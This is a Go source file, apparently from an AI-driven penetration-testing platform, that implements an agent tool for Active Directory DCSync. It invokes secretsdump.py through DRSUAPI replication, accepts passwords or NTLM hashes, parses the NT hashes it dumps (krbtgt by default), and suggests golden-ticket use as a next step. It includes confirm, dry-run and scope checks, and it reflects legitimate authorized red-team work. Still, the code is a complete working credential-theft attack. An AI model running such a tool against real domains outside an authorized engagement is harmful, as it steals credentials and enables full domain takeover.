package agent

// AD DCSync (T1003.006): DRSUAPI replication with an existing domain credential.
//
// This is intentionally a high-friction tool:
//   - requires explicit confirm=true (dry_run bypasses it);
//   - requires a target account (default workflow: krbtgt);
//   - hashes are returned to the tool caller but are NOT written into finding
//     evidence (findings are broadly readable; the credential store is not);
//   - only code builds/executes secretsdump.py and parses the NT hash lines.

import (
	"context"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/Autumn-27/artex/db"
	actool "github.com/Autumn-27/norma/tool"
)

const dcsyncModuleID = "ad.dcsync"

var (
	dcsyncLocateRunner = func() (kerberoastRunner, error) {
		return locateImpacketScript("secretsdump.py", "impacket-secretsdump")
	}
	dcsyncExecRunner = execKerberoastCommand
)

type dcsyncParams struct {
	DC           string          `json:"dc"`
	Domain       string          `json:"domain"`
	TargetUser   string          `json:"target_user"`
	Username     string          `json:"username,omitempty"`
	Password     string          `json:"password,omitempty"`
	Hash         string          `json:"hash,omitempty"`
	CredentialID json.RawMessage `json:"credential_id,omitempty"`
	TimeoutSec   int             `json:"timeout_sec,omitempty"`
	Confirm      bool            `json:"confirm"`
	DryRun       bool            `json:"dry_run,omitempty"`
}

func (p *dcsyncParams) Validate() error {
	if p.TimeoutSec <= 0 {
		p.TimeoutSec = 300
	}
	kp := kerberoastParams{
		DC: p.DC, Domain: p.Domain, Username: p.Username, Password: p.Password,
		Hash: p.Hash, CredentialID: p.CredentialID, LDAPPort: 389, TimeoutSec: p.TimeoutSec,
	}
	if err := kp.Validate(); err != nil {
		return err
	}
	p.DC, p.Domain, p.Username, p.Password, p.Hash = kp.DC, kp.Domain, kp.Username, kp.Password, kp.Hash
	p.TimeoutSec = kp.TimeoutSec
	p.TargetUser = sanitizeADAccount(p.TargetUser)
	if p.TargetUser == "" {
		return fmt.Errorf("target_user 必填（通常为 krbtgt；不要用 -just-dc 全量导出）")
	}
	if p.Username == "" && len(p.CredentialID) == 0 && !p.DryRun {
		return fmt.Errorf("DCSync 需要已有域凭据（username/password/hash 或 credential_id）")
	}
	if !p.Confirm && !p.DryRun {
		return fmt.Errorf("DCSync 是高影响操作：确认 RoE 与目标后设置 confirm=true 才执行；可先用 dry_run=true 检查工具与端口")
	}
	return nil
}

type dcsyncHash struct {
	AccountName string `json:"account_name"`
	RID         string `json:"rid,omitempty"`
	LMHash      string `json:"lm_hash,omitempty"`
	NTHash      string `json:"nt_hash"`
}

type dcsyncFinding struct {
	AccountName string `json:"account_name"`
	Severity    string `json:"severity"`
	Title       string `json:"title"`
	FindingID   int64  `json:"finding_id,omitempty"`
	NodeID      int64  `json:"node_id,omitempty"`
	Merged      bool   `json:"merged,omitempty"`
	RecordError string `json:"record_error,omitempty"`
}

type dcsyncResult struct {
	ModuleID   string          `json:"module_id"`
	MITRE      string          `json:"mitre"`
	Status     string          `json:"status"` // success | partial | failed | dry_run
	DC         string          `json:"dc"`
	Domain     string          `json:"domain"`
	TargetUser string          `json:"target_user"`
	Auth       *kerberoastAuth `json:"auth,omitempty"`
	Hashes     []dcsyncHash    `json:"hashes"`
	Findings   []dcsyncFinding `json:"findings,omitempty"`
	Tooling    map[string]any  `json:"tooling,omitempty"`
	NextSteps  []string        `json:"next_steps,omitempty"`
	Warnings   []string        `json:"warnings,omitempty"`
	Error      string          `json:"error,omitempty"`
	OutputTail string          `json:"output_tail,omitempty"`
	ElapsedMs  int64           `json:"elapsed_ms"`
}

func (t *ToolSet) toolDCSync() actool.CoreTool {
	return t.writeExpTool("ad_dcsync",
		"【AD 攻击 · T1003.006 DCSync】用已有域凭据经 DRSUAPI 复制指定账号的凭据（secretsdump.py -just-dc-user）。\n"+
			"这是高影响操作：必须显式 confirm=true；建议 target_user=krbtgt，禁止 -just-dc 全量导出。\n"+
			"执行归代码：构造 secretsdump 参数、解析 DOMAIN\\user:RID:LM:NT::: 行、返回 hashes 并回写不含哈希的 finding；密码/hash 由 credential_id 或显式参数提供。\n"+
			"前提：凭据具备 DCSync/复制权限（Domain Admin / Replicating Directory Changes），DC 的 445/135 可达，已装 impacket。\n"+
			"dry_run=true 只检查 secretsdump 与 DC 端口，不需要 confirm。",
		obj(map[string]any{
			"dc":            str("域控 IP 或 FQDN，必填"),
			"domain":        str("AD DNS 域名，如 CORP.LOCAL，必填"),
			"target_user":   str("要复制的账号 sAMAccountName，必填；通常为 krbtgt"),
			"credential_id": map[string]any{"type": "integer", "description": "平台凭据 id；不传则自动选域匹配的 password/hash_nt 凭据"},
			"username":      str("可选：显式域用户名（需同时给 password 或 hash）"),
			"password":      str("可选：显式口令（优先用 credential_id）"),
			"hash":          str("可选：显式 NTLM hash，NT(32 hex) 或 LMHASH:NTHASH"),
			"timeout_sec":   map[string]any{"type": "integer", "description": "secretsdump 超时秒数，默认 300，范围 30..900", "default": 300},
			"confirm":       map[string]any{"type": "boolean", "description": "执行 DCSync 必须显式 true（dry_run 除外）"},
			"dry_run":       map[string]any{"type": "boolean", "description": "只检查 secretsdump 与 DC 445/135/389 可达，不执行复制"},
		}, "dc", "domain", "target_user", "confirm"),
		t.dcsyncHandler)
}

func (t *ToolSet) dcsyncHandler(ctx context.Context, in json.RawMessage) (actool.Result, error) {
	var p dcsyncParams
	if err := json.Unmarshal(in, &p); err != nil {
		return actool.Errorf("参数解析失败：" + err.Error()), nil
	}
	if err := p.Validate(); err != nil {
		return actool.Errorf(err.Error()), nil
	}
	if err := t.assertInScope(p.DC); err != nil {
		return actool.Errorf(err.Error()), nil
	}
	start := time.Now()
	res := dcsyncResult{
		ModuleID: dcsyncModuleID, MITRE: "T1003.006", Status: "failed",
		DC: p.DC, Domain: p.Domain, TargetUser: p.TargetUser, Hashes: []dcsyncHash{},
	}

	if p.DryRun {
		res.Status = "dry_run"
		res.Tooling = t.dcsyncDryRun(ctx, &p)
		res.ElapsedMs = time.Since(start).Milliseconds()
		res.NextSteps = []string{
			"dry_run 通过后，确认 RoE/目标并设置 confirm=true、target_user=krbtgt",
			"DCSync 需要复制权限；普通域用户会 rpc_s_access_denied",
		}
		return jsonResult(res)
	}

	kp := &kerberoastParams{
		DC: p.DC, Domain: p.Domain, Username: p.Username, Password: p.Password,
		Hash: p.Hash, CredentialID: p.CredentialID, LDAPPort: 389, TimeoutSec: p.TimeoutSec,
	}
	cred, err := t.resolveKerberoastCredential(ctx, kp)
	if err != nil {
		res.Error = err.Error()
		res.NextSteps = []string{"先 add_credential 登记具备复制权限的域凭据，或显式传 username+password/hash"}
		res.ElapsedMs = time.Since(start).Milliseconds()
		return jsonResult(res)
	}
	a := cred.authInfo()
	res.Auth = &a

	out, runErr := t.runDCSync(ctx, &p, &cred)
	res.ElapsedMs = time.Since(start).Milliseconds()
	res.Hashes = parseDCSyncHashes(out)
	if runErr != nil && len(res.Hashes) == 0 {
		res.Status = "failed"
		res.Error = dcsyncRunErrorMessage(runErr, out, time.Duration(p.TimeoutSec)*time.Second)
		res.OutputTail = kerbTruncate(out, kerberoastOutputTail)
		res.NextSteps = []string{
			"确认凭据具备 DCSync/复制权限、DC 445/135 可达、时钟偏差 ≤5 分钟",
			"如果只有普通域凭据，先做 Kerberoast/AS-REP/ADCS 提权，不要直接 DCSync",
		}
		return jsonResult(res)
	}
	if len(res.Hashes) > 0 {
		res.Status = "success"
		t.recordDCSyncFinding(ctx, &res)
		res.NextSteps = []string{
			"用 add_credential 登记 target_user 的 NT hash（verified=true）；不要把哈希写进 report/evidence",
			"krbtgt 哈希可用于黄金票据；使用后按客户要求轮换 krbtgt（两次）",
			"DCSync 是高影响动作，落库/报告前确认 RoE 与证据保留要求",
		}
		if runErr != nil {
			res.Warnings = append(res.Warnings, "部分输出失败："+dcsyncRunErrorMessage(runErr, out, time.Duration(p.TimeoutSec)*time.Second))
		}
	} else {
		res.Status = "partial"
		res.OutputTail = kerbTruncate(out, kerberoastOutputTail)
		res.Warnings = append(res.Warnings, "secretsdump 未返回可解析的 NT hash 行；可能账号不存在/无权限/输出格式变化")
	}
	return jsonResult(res)
}

func (t *ToolSet) dcsyncDryRun(ctx context.Context, p *dcsyncParams) map[string]any {
	out := map[string]any{"target_user": p.TargetUser}
	for _, port := range []int{445, 135, 389} {
		ok, errText := probeADTCP(ctx, p.DC, port, 5*time.Second)
		m := map[string]any{"port": port, "reachable": ok}
		if errText != "" {
			m["error"] = errText
		}
		out[fmt.Sprintf("tcp_%d", port)] = m
	}
	if runner, err := dcsyncLocateRunner(); err != nil {
		out["impacket_ready"] = false
		out["impacket_error"] = err.Error()
	} else {
		out["impacket_ready"] = true
		out["runner"] = runner.Bin
	}
	return out
}

func (t *ToolSet) runDCSync(ctx context.Context, p *dcsyncParams, cred *resolvedKerberoastCred) (string, error) {
	runner, err := dcsyncLocateRunner()
	if err != nil {
		return "", err
	}
	args, err := buildDCSyncArgs(p, cred)
	if err != nil {
		return "", err
	}
	out, err := dcsyncExecRunner(ctx, runner, args, time.Duration(p.TimeoutSec)*time.Second)
	out = redactKerberoastSecret(out, cred.Password)
	return out, err
}

func buildDCSyncArgs(p *dcsyncParams, cred *resolvedKerberoastCred) ([]string, error) {
	host := strings.TrimSpace(p.DC)
	target := strings.TrimSpace(p.Domain) + "/" + cred.Username
	if cred.Password != "" {
		target += ":" + cred.Password
	}
	if host == "" {
		return nil, fmt.Errorf("dc 为空")
	}
	if !strings.Contains(host, ":") {
		target += "@" + host
	} else {
		target += "@[" + host + "]"
	}
	args := []string{target, "-dc-ip", host, "-just-dc-user", p.TargetUser}
	if cred.Hash != "" {
		h, err := normalizeKerberoastHashes(cred.Hash)
		if err != nil {
			return nil, err
		}
		args = append(args, "-hashes", h)
	}
	if cred.Password == "" && cred.Hash == "" {
		args = append(args, "-no-pass")
	}
	return args, nil
}

func parseDCSyncHashes(out string) []dcsyncHash {
	hashes := []dcsyncHash{}
	seen := map[string]bool{}
	for _, rawLine := range strings.Split(strings.ReplaceAll(out, "\r\n", "\n"), "\n") {
		line := strings.TrimSpace(rawLine)
		if line == "" || strings.HasPrefix(line, "[") || strings.HasPrefix(line, "*") {
			continue
		}
		parts := strings.Split(line, ":")
		if len(parts) < 4 {
			continue
		}
		principal := parts[0]
		slash := strings.LastIndex(principal, `\`)
		if slash < 0 || slash == len(principal)-1 {
			continue
		}
		account := principal[slash+1:]
		nt := strings.TrimSpace(parts[3])
		if len(nt) != 32 {
			continue
		}
		if _, err := hex.DecodeString(nt); err != nil {
			continue
		}
		key := account + ":" + parts[1]
		if seen[key] {
			continue
		}
		seen[key] = true
		hashes = append(hashes, dcsyncHash{
			AccountName: account, RID: parts[1], LMHash: strings.TrimSpace(parts[2]), NTHash: nt,
		})
	}
	return hashes
}

func dcsyncRunErrorMessage(runErr error, out string, timeout time.Duration) string {
	lower := strings.ToLower(out)
	switch {
	case strings.Contains(lower, "rpc_s_access_denied") || strings.Contains(lower, "access_denied"):
		return "DCSync 被拒：凭据没有复制权限（需要 Replicating Directory Changes / DCSync）；先提权"
	case strings.Contains(lower, "status_logon_failure") || strings.Contains(lower, "invalid credentials"):
		return "域凭据错误或不可用；检查 username/password/hash 与域"
	case strings.Contains(lower, "kdc_err_skew") || strings.Contains(lower, "clock skew"):
		return "DC 与执行端时钟偏差过大（>5 分钟）；先同步时间"
	case strings.Contains(lower, "connection refused") || strings.Contains(lower, "timed out") ||
		strings.Contains(lower, "no route to host"):
		return "无法连接 DC 的 445/135；确认网络可达或先建隧道"
	case strings.Contains(lower, "ntlm") && strings.Contains(lower, "not supported"):
		return "DC 拒绝了 NTLM/DRSUAPI 认证；检查协议与凭据类型"
	case strings.Contains(lower, "impacket") || strings.Contains(lower, "modulenotfound"):
		return "secretsdump/impacket 不可用；安装：python -m pip install impacket"
	}
	if runErr == nil {
		return "secretsdump 未返回哈希"
	}
	return fmt.Sprintf("secretsdump 执行失败：%v", runErr)
}

func (t *ToolSet) recordDCSyncFinding(ctx context.Context, res *dcsyncResult) {
	if t.ts == nil || len(res.Hashes) == 0 {
		return
	}
	assetIDs := t.kerberoastAssetIDs(res.DC)
	for _, h := range res.Hashes {
		title := fmt.Sprintf("DCSync: %s\\%s 可复制凭据", res.Domain, h.AccountName)
		summary := fmt.Sprintf("使用凭据对 DC %s 执行 DCSync，成功复制 %s 的 NT hash", res.DC, h.AccountName)
		// Never put the NT hash into finding evidence: findings are broadly
		// readable, the credential store is the place for secrets.
		evidence := fmt.Sprintf("technique=DRSUAPI (secretsdump -just-dc-user)\ndc=%s\ntarget=%s\\%s\nrid=%s\nhash=returned in tool result; register with add_credential",
			res.DC, res.Domain, h.AccountName, h.RID)
		input := db.RecordFindingInput{
			TaskID: t.taskID, ExplorationID: t.ts.ID(), IntentID: t.ownerNode,
			VulnClass: "dcsync", Name: title, Severity: "critical",
			Summary: summary, Evidence: evidence, Worker: t.worker, AssetIDs: assetIDs,
		}
		var rec *db.RecordedFinding
		var err error
		if t.findingRecorder != nil {
			rec, err = t.findingRecorder.Record(ctx, input, nil)
		} else {
			rec, err = t.ts.RecordFinding(ctx, input)
		}
		f := dcsyncFinding{AccountName: h.AccountName, Severity: "critical", Title: title}
		if err != nil {
			f.RecordError = err.Error()
		} else if rec != nil {
			f.FindingID, f.NodeID, f.Merged = rec.FindingID, rec.NodeID, rec.Merged
			t.writes.Findings++
		}
		res.Findings = append(res.Findings, f)
	}
	if len(res.Findings) > 0 {
		if t.notifyFinding != nil {
			t.notifyFinding(t.ownerNode, fmt.Sprintf("DCSync 成功：%s", res.TargetUser))
		} else if t.notify != nil {
			t.notify()
		}
	}
}
